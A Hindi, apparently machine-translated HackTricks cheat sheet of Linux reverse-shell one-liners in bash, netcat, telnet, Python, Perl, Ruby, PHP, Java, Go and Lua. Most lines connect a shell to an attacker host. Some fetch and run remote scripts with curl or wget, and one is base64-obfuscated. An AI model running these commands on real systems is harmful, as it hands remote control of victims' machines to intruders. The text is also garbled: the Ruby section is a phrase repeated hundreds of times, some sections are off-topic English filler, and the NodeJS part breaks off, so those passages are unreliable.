# शेल्स - लिनक्स

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित करना चाहते हैं**? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स को** [**हैकट्रिक्स रेपो**](https://github.com/carlospolop/hacktricks) **और** [**हैकट्रिक्स-क्लाउड रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में पीआर जमा करके साझा करें।**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

विशेषता को ध्यान में रखते हुए विकसित करें जो अधिक मायने रखती हैं ताकि आप उन्हें तेजी से ठीक कर सकें। इंट्रूडर आपकी हमला सतह का ट्रैक करता है, प्रोएक्टिव धमकी स्कैन चलाता है, एपीआई से वेब ऐप्स और क्लाउड सिस्टम तक आपके पूरे टेक स्टैक में मुद्दों का पता लगाता है। [**इसे मुफ़्त में आज़माएं**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**यदि आपके पास इन शेल्स के बारे में कोई सवाल हैं, तो आप उन्हें** [**https://explainshell.com/**](https://explainshell.com) **के साथ जांच सकते हैं**

## पूर्ण TTY

**एक रिवर्स शेल प्राप्त करने के बाद**[ **पूर्ण TTY प्राप्त करने के लिए इस पेज को पढ़ें**](full-ttys.md)**।**

## बैश | शेल
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
### सिम्बल सुरक्षित शैल

अन्य शैलों के साथ जांच करना न भूलें: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, और bash।
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### शैल समझावट

1. **`bash -i`**: इस भाग में कमांड एक इंटरैक्टिव (`-i`) बैश शैल शुरू करता है।
2. **`>&`**: इस भाग में कमांड **स्टैंडर्ड आउटपुट** (`stdout`) और **स्टैंडर्ड त्रुटि** (`stderr`) को **एक ही निर्देशांक पर पुनर्निर्देशित करने** के लिए एक संक्षेप नोटेशन है।
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: यह एक विशेष फ़ाइल है जो निर्दिष्ट आईपी पते और पोर्ट के लिए एक TCP कनेक्शन को **प्रतिष्ठित करती है**।
* **इस फ़ाइल पर आउटपुट और त्रुटि स्ट्रीम को पुनर्निर्देशित करके**, कमांड अपरिहार्य रूप से इंटरैक्टिव शैल सत्र का आउटपुट हमलावरण की मशीन को भेजता है।
4. **`0>&1`**: इस भाग में कमांड **स्टैंडर्ड इनपुट (`stdin`) को स्टैंडर्ड आउटपुट (`stdout`) के समान निर्देशांक पर पुनर्निर्देशित करता है**।

### फ़ाइल में बनाएँ और निष्पादित करें
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## फ़ॉरवर्ड शेल

आपको कई मामलों में मिल सकता है जहां आपके पास एक लिनक्स मशीन में एक वेब ऐप में RCE होता है, लेकिन Iptables नियमों या अन्य प्रकार के फ़िल्टरिंग के कारण आपको एक रिवर्स शेल प्राप्त नहीं हो सकती है। यह "शेल" आपको पाइप्स का उपयोग करके पीड़ित सिस्टम के अंदर RCE के माध्यम से एक PTY शेल बनाए रखने की अनुमति देता है।\
आप [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell) में कोड पा सकते हैं।

आपको बस निम्नलिखित को संशोधित करना होगा:

* संकटपूर्ण होस्ट का URL
* अपने पेलोड का प्रीफ़िक्स और सफ़िक्स (यदि कोई हो)
* पेलोड भेजने का तरीका (हैडर? डेटा? अतिरिक्त जानकारी?)

फिर, आप बस **कमांड भेज सकते हैं** या यहां तक कि आप पूर्ण PTY प्राप्त करने के लिए `अपग्रेड` कमांड का उपयोग कर सकते हैं (ध्यान दें कि पाइप्स को लगभग 1.3 सेकंड की देरी के साथ पढ़ा और लिखा जाता है)।

## नेटकैट
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

इसे [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/) पर जांचें।
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## टेलनेट

Telnet एक नेटवर्क प्रोटोकॉल है जिसका उपयोग रिमोट मशीनों पर दूरस्थ लॉगिन करने के लिए किया जाता है। यह TCP/IP प्रोटोकॉल का एक हिस्सा है और इंटरनेट पर उपयोग होता है। टेलनेट का उपयोग करके, आप रिमोट मशीन पर कमांड लाइन इंटरफेस के माध्यम से कार्य कर सकते हैं।

टेलनेट का उपयोग करने के लिए, आपको टेलनेट क्लाइंट सॉफ़्टवेयर की आवश्यकता होती है जो आपको रिमोट मशीन से कनेक्ट करने में मदद करता है। आप टेलनेट क्लाइंट का उपयोग करके रिमोट मशीन पर लॉगिन कर सकते हैं और उस पर कमांड चला सकते हैं।

टेलनेट का उपयोग करने के लिए, आपको रिमोट मशीन का IP पता और टेलनेट सर्वर का पोर्ट नंबर जानना होगा। आप टेलनेट क्लाइंट के माध्यम से इस जानकारी को दर्ज करके रिमोट मशीन से कनेक्ट हो सकते हैं।

टेलनेट का उपयोग करने के लिए, आपको टेलनेट क्लाइंट के माध्यम से रिमोट मशीन पर लॉगिन करने के लिए उपयोगकर्ता नाम और पासवर्ड की आवश्यकता हो सकती है। इसके बाद, आप रिमोट मशीन पर कमांड चला सकते हैं और उसकी व्यवस्था कर सकते हैं।

टेलनेट का उपयोग करने के द्वारा, आप रिमोट मशीन पर दूरस्थ शेल का उपयोग कर सकते हैं और उसे कंप्यूटर नेटवर्क में अनुकरण कर सकते हैं। यह एक प्रभावी तकनीक है जो आपको रिमोट मशीन पर नियंत्रण प्राप्त करने में मदद कर सकती है।
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
अटैकर
```bash
while true; do nc -l <port>; done
```
इस कमांड को भेजने के लिए इसे लिखें, एंटर दबाएं और CTRL+D दबाएं (STDIN को रोकने के लिए)

**पीड़ित**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## पायथन

Python is a versatile and powerful programming language that is widely used in the field of hacking. It is known for its simplicity and readability, making it a popular choice among hackers.

### Python Shells

Python shells are interactive environments where you can write and execute Python code. They provide a convenient way to test and debug your code without the need for a separate text editor or IDE.

#### Standard Python Shell

The standard Python shell, also known as the Python interactive interpreter, is a basic shell that comes pre-installed with Python. It allows you to execute Python code line by line and see the results immediately.

To start the standard Python shell, simply open a terminal or command prompt and type `python` or `python3` depending on your Python version.

#### IPython Shell

IPython is an enhanced Python shell that provides additional features and functionality compared to the standard Python shell. It includes features such as tab completion, syntax highlighting, and built-in documentation.

To start the IPython shell, you need to install the IPython package first. You can do this by running the following command:

```
pip install ipython
```

Once installed, you can start the IPython shell by typing `ipython` in the terminal or command prompt.

### Python Scripts

In addition to using Python shells, you can also write Python code in scripts. Python scripts are files with a `.py` extension that contain a series of Python statements. These scripts can be executed from the command line or imported as modules in other Python programs.

To create a Python script, simply create a new file with a `.py` extension and write your Python code inside it. You can then execute the script by running the following command:

```
python script.py
```

Replace `script.py` with the name of your Python script.

### Python Libraries

Python has a vast ecosystem of libraries and modules that extend its functionality. These libraries provide pre-written code for various tasks, making it easier to develop complex hacking tools and scripts.

Some popular Python libraries for hacking include:

- **Requests**: A library for making HTTP requests and interacting with web services.
- **Beautiful Soup**: A library for parsing HTML and XML documents.
- **Scapy**: A powerful packet manipulation library for network analysis and manipulation.
- **Paramiko**: A library for SSH protocol implementation, allowing you to automate SSH connections and execute commands on remote servers.
- **Pycrypto**: A library for cryptographic operations, such as encryption, decryption, and hashing.

To use a Python library, you need to install it first. You can do this using the `pip` package manager. For example, to install the Requests library, you can run the following command:

```
pip install requests
```

Once installed, you can import the library in your Python code using the `import` statement. For example:

```python
import requests
```

This allows you to use the functions and classes provided by the library in your code.

### Conclusion

Python is a powerful programming language that is widely used in the field of hacking. Whether you are using Python shells, writing Python scripts, or leveraging Python libraries, Python provides a flexible and efficient way to develop hacking tools and scripts.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## पर्ल

Perl एक शक्तिशाली और व्यापक स्क्रिप्टिंग भाषा है जिसे लिनक्स पर उपयोग किया जा सकता है। यह एक इंटरप्रेटेड भाषा है जिसे लाइन-ओरिएंटेड सिंटेक्स के साथ लिखा जाता है। Perl का उपयोग विभिन्न कार्यों को करने के लिए किया जा सकता है, जैसे कि फ़ाइलों को पढ़ना, लिखना, संशोधित करना, नेटवर्क कम्यूनिकेशन, डेटाबेस एक्सेस, और अन्य टास्क।

यदि आपके पास Perl स्क्रिप्ट है और आप उसे लिनक्स शेल में चलाना चाहते हैं, तो निम्नलिखित चरणों का पालन करें:

1. Perl स्क्रिप्ट को एक फ़ाइल में सहेजें, उदाहरण के लिए `script.pl`.

2. फ़ाइल को एक्सीक्यूटेबल बनाने के लिए निम्नलिखित कमांड का उपयोग करें:
   ```
   chmod +x script.pl
   ```

3. अब, आप इसे लिनक्स शेल में चला सकते हैं इसके लिए निम्नलिखित कमांड का उपयोग करें:
   ```
   ./script.pl
   ```

इस तरह, आप अपने Perl स्क्रिप्ट को लिनक्स शेल में सफलतापूर्वक चला सकते हैं।
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## रूबी

Ruby एक उच्च स्तरीय, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-संग्रहीत, विषय-सं
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP (Hypertext Preprocessor) एक वेब डेवलपमेंट स्क्रिप्टिंग भाषा है जिसका उपयोग वेब ऐप्लिकेशन और वेबसाइट्स बनाने के लिए किया जाता है। PHP एक open source भाषा है और यह सर्वर साइड पर प्रोसेस होती है, यानी कि यह सर्वर पर चलने वाले स्क्रिप्ट को प्रोसेस करती है। PHP को HTML में एम्बेड किया जा सकता है और यह डाटाबेस कनेक्शन, फ़ाइल प्रोसेसिंग, फ़ॉर्म प्रोसेसिंग और अन्य वेब डेवलपमेंट कार्यों के लिए उपयोगी होता है।

PHP के लिए शेल एक उपयोगी टूल है जो वेबसाइटों को हैक करने में मदद करता है। शेल का उपयोग करके आप PHP स्क्रिप्ट को सर्वर पर अपलोड कर सकते हैं और उसे रन कर सकते हैं। शेल के माध्यम से आप वेबसाइट के फ़ाइलों को पढ़ सकते हैं, लिख सकते हैं, और संपादित कर सकते हैं। इसके अलावा, आप शेल के माध्यम से डाटाबेस के साथ कनेक्शन बना सकते हैं और डाटाबेस के डेटा को पढ़, लिख और संपादित कर सकते हैं।

शेल के लिए कुछ उपयोगी PHP फ़ंक्शन हैं जैसे कि `shell_exec()`, `exec()`, `system()`, `passthru()` और `popen()`। इन फ़ंक्शन का उपयोग करके आप शेल कमांड्स को चला सकते हैं और उनके आउटपुट को प्राप्त कर सकते हैं। यह आपको वेबसाइट के सर्वर पर विभिन्न कार्रवाईयों को करने की अनुमति देता है, जैसे कि फ़ाइलों को डाउनलोड करना, फ़ाइलों को अपलोड करना, फ़ाइलों को हटाना, डाटाबेस के साथ कार्रवाई करना आदि।

शेल का उपयोग करते समय सुरक्षा का ध्यान रखना बहुत महत्वपूर्ण है। शेल के उपयोग को सीमित करने के लिए, आपको शेल एक्सीक्यूशन के लिए अनुमति देने से पहले उपयोगकर्ता की इनपुट को सत्यापित करना चाहिए। इसके अलावा, आपको शेल कमांड्स को संग्रहीत करने और उन्हें सुरक्षित रखने के लिए उचित सुरक्षा उपाय अपनाने चाहिए।
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## जावा

Java एक उच्च स्तरीय, विश्वसनीय, और सुरक्षित प्रोग्रामिंग भाषा है जो विभिन्न प्लेटफ़ॉर्मों पर चलने वाले एप्लिकेशन विकसित करने के लिए उपयोग की जाती है। यह एक ऑब्जेक्ट-ओरिएंटेड भाषा है जिसमें एकल थ्रेड और बहु-थ्रेड एप्लिकेशन विकसित किए जा सकते हैं। जावा को स्थानीय या वेब आधारित एप्लिकेशन, मोबाइल एप्लिकेशन, गेम, डेस्कटॉप एप्लिकेशन, और डेटाबेस एप्लिकेशन जैसे विभिन्न उद्देश्यों के लिए उपयोग किया जा सकता है।

जावा को कंपाइल करने के लिए JDK (जावा विकासकियों का संगठन) की आवश्यकता होती है, जो जावा कोड को मशीन कोड में बदलता है। जावा कोड को कंपाइल करने के बाद, इसे JVM (जावा वर्चुअल मशीन) पर चलाया जा सकता है, जो जावा कोड को विभिन्न प्लेटफ़ॉर्मों पर चलने के लिए अनुभव कराता है।

जावा में कुछ महत्वपूर्ण ख़ासियतें शामिल हैं, जैसे कि गारबेज कलेक्शन, एक्सेप्शन हैंडलिंग, थ्रेडिंग, और जावा एप्लेट्स। यह भाषा अद्यतित और सुरक्षित रहने के लिए नियमित रूप से अपडेट की जाती है और इसमें विभिन्न लाइब्रेरी और फ्रेमवर्क्स उपलब्ध हैं जो विकासकों को अधिक सुविधाएं प्रदान करते हैं।

जावा का उपयोग करके, आप विभिन्न उद्देश्यों के लिए एप्लिकेशन विकसित कर सकते हैं, जैसे कि वेब विकास, डेटा विज़ुअलाइज़ेशन, मोबाइल एप्लिकेशन, और गेम विकास। जावा की व्यापकता और सुरक्षा के कारण, यह एक लोकप्रिय प्रोग्रामिंग भाषा है और उद्योग में व्यापक रूप से उपयोग की जाती है।
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat is a powerful networking utility that is included in the Nmap suite. It is a feature-rich tool that can be used for various purposes, such as port scanning, banner grabbing, and creating network connections.

### Installation

To install Ncat on Linux, you can use the package manager of your distribution. For example, on Debian-based systems, you can use the following command:

```
sudo apt-get install nmap
```

### Basic Usage

Ncat can be used to establish TCP and UDP connections, listen for incoming connections, and transfer data between hosts. Here are some basic examples:

- To connect to a remote host on a specific port:

```
ncat <host> <port>
```

- To listen for incoming connections on a specific port:

```
ncat -l <port>
```

- To transfer a file from one host to another:

```
ncat -l <port> > file.txt
```

```
ncat <host> <port> < file.txt
```

### Advanced Usage

Ncat supports various options and features that can be used to perform more advanced tasks. Some of these include:

- SSL/TLS encryption: Ncat can encrypt the communication between hosts using SSL/TLS protocols.

- Proxy support: Ncat can be used as a proxy server to forward connections to other hosts.

- Port forwarding: Ncat can forward connections from one port to another, allowing you to access services running on remote hosts.

- Scripting: Ncat supports Lua scripting, which allows you to automate tasks and create custom behaviors.

### Conclusion

Ncat is a versatile networking utility that can be used for a wide range of tasks. Whether you need to establish network connections, transfer data, or perform advanced tasks, Ncat provides the necessary tools and features.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

सबसे महत्वपूर्ण संकटों को ढूंढें ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमले की सतह का ट्रैक करता है, प्रोएक्टिव धमकी स्कैन चलाता है, एपीआई से वेब ऐप्स और क्लाउड सिस्टम तक आपके पूरे टेक स्टैक में मुद्दों को ढूंढता है। [**आज ही मुफ्त में इसे ट्राय करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## गोलैंग
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## लुआ

Lua एक लाइटवेट, तेज़ और प्रोग्रामिंग भाषा है जो एकीकृत विकास और एकीकृत प्रबंधन के लिए उपयोग होती है। यह एक वाणिज्यिक उपयोग के लिए उपयोग होने वाली भाषा है और इंटरनेट, वेब विकास, गेम विकास और एम्बेडेड सिस्टम्स में व्यापक रूप से उपयोग की जाती है।

Lua का उपयोग करके, आप लाइन या स्क्रिप्ट के रूप में कोड लिख सकते हैं और इसे एक Lua इंटरप्रेटर द्वारा चलाया जा सकता है। यह भाषा विभिन्न प्लेटफ़ॉर्मों पर उपयोग के लिए उपलब्ध है और इसे अनुकूलित करने के लिए विभिन्न एक्सटेंशन और मॉड्यूल भी उपलब्ध हैं।

Lua का उपयोग करके, आप सिस्टम कमांड्स को चला सकते हैं, फ़ाइलों को पढ़ सकते हैं, लिख सकते हैं, नेटवर्क कमांड्स को चला सकते हैं, और अन्य उपयोगी कार्रवाईयों को कर सकते हैं। इसके अलावा, आप Lua का उपयोग करके अन्य भाषाओं के साथ इंटरैक्ट कर सकते हैं, जैसे कि C, C++, और जावा।

यदि आपको Lua का उपयोग करना है, तो आपको Lua इंटरप्रेटर को इंस्टॉल करना होगा और फिर आप इंटरैक्टिव मोड में कोड लिख सकते हैं या स्क्रिप्ट फ़ाइल को चला सकते हैं। Lua के लिए विभिन्न IDEs और टेक्स्ट एडिटर भी उपलब्ध हैं जो आपको कोडिंग की सुविधा प्रदान करते हैं।
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## नोडजेएस

NodeJS एक ओपन सोर्स, एकवर्षीय, एवं एक चालक वातावरण है जो जावास्क्रिप्ट चलाने के लिए उपयोग होता है। यह वेब सर्वर और नेटवर्क ऐप्लिकेशन विकसित करने के लिए उपयोग होता है। नोडजेएस एक एकवर्षीय वातावरण होने के कारण, यह अनुरोधों को असिंक्रोनस तरीके से प्रोसेस कर सकता है, जिससे यह अधिक उच्च प्रदर्शन देता है।

नोडजेएस के लिए शेल एक उपयोगी उपकरण हो सकता है, जिससे आप नोडजेएस एप्लिकेशन को नियंत्रित कर सकते हैं। शेल के माध्यम से, आप नोडजेएस एप्लिकेशन के लिए विभिन्न कार्रवाईयों को कर सकते हैं, जैसे कि एप्लिकेशन को शुरू करना, बंद करना, रीस्टार्ट करना, लॉग फ़ाइल्स को देखना, और अन्य निर्दिष्ट कार्रवाइयाँ करना।

शेल के लिए नोडजेएस एक्सेस प्राप्त करने के लिए, आपको नोडजेएस एप्लिकेशन के लिए एक शेल सत्र शुरू करना होगा। इसके लिए, आप निम्नलिखित कमांड का उपयोग कर सकते हैं:

```bash
node
```

